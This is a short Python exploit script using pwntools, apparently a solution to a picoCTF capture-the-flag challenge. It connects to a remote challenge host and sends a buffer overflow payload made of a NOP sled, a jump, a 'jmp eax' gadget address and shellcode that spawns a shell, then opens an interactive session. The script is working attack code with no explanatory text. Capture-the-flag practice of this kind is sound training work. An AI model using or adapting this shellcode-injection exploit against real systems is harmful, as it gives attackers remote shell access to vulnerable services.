from pwn import *

host, port = 'saturn.picoctf.net', 65314
p = remote(host, port)
#p = process("./vuln")

elf = context.binary = ELF("./vuln")

p.recvuntil(b"grasshopper!")

payload = b"\x90" * 26 + asm("jmp $+0x6")
payload += p32(0x0805333b)                 # jmp eax 
payload += asm(shellcraft.sh())

p.sendline(payload)

open("payload","wb").write(payload)

p.interactive()

